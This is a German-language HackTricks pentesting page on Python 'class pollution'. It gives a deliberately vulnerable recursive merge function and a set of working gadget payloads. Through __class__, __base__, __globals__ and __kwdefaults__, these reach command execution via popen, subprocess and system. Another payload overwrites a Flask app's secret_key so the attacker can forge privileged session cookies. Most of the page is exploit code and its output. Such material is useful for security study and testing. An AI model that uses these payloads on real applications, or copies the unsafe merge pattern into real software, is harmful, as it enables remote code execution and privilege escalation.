# Klassenverschmutzung (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Grundlegendes Beispiel

Überprüfen Sie, wie es möglich ist, Klassen von Objekten mit Zeichenfolgen zu verschmutzen:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Grundlegendes Schwachstellenbeispiel
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget-Beispiele

<details>

<summary>Erstellen eines Standardwerts für Klassenattribute zu RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Verschmutzung anderer Klassen und globaler Variablen durch <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Willkürliche Unterprozessausführung</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Überschreiben von <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** ist ein spezielles Attribut aller Funktionen, basierend auf der Python [Dokumentation](https://docs.python.org/3/library/inspect.html), es ist eine „Zuordnung von Standardwerten für **nur-Schlüsselwort**-Parameter“. Das Verunreinigen dieses Attributs ermöglicht es uns, die Standardwerte der nur-Schlüsselwort-Parameter einer Funktion zu steuern, dies sind die Parameter der Funktion, die nach \* oder \*args kommen.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Überschreiben des Flask-Geheimnisses über Dateien hinweg</summary>

Wenn Sie also eine Klassenverschmutzung über ein Objekt durchführen können, das in der Haupt-Python-Datei des Webs definiert ist, aber **dessen Klasse in einer anderen Datei** als der Hauptdatei definiert ist. Denn um auf \_\_globals\_\_ in den vorherigen Payloads zuzugreifen, müssen Sie auf die Klasse des Objekts oder die Methoden der Klasse zugreifen, werden Sie in der Lage sein, **auf die Globals in dieser Datei zuzugreifen, aber nicht in der Hauptdatei**. \
Daher werden Sie **nicht in der Lage sein, auf das globale Flask-App-Objekt** zuzugreifen, das den **Geheimschlüssel** auf der Hauptseite definiert:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In diesem Szenario benötigen Sie ein Gadget, um Dateien zu durchlaufen, um auf das Hauptobjekt **`app.secret_key`** zuzugreifen, um den Flask-Geheimschlüssel zu ändern und in der Lage zu sein, [**Privilegien zu eskalieren**, indem Sie diesen Schlüssel kennen](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Eine Payload wie diese [aus diesem Bericht](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Verwenden Sie diese Payload, um **`app.secret_key`** zu ändern (der Name in Ihrer App könnte anders sein), um neue und privilegiertere Flask-Cookies signieren zu können.

</details>

Überprüfen Sie auch die folgende Seite für weitere schreibgeschützte Gadgets:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Referenzen

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
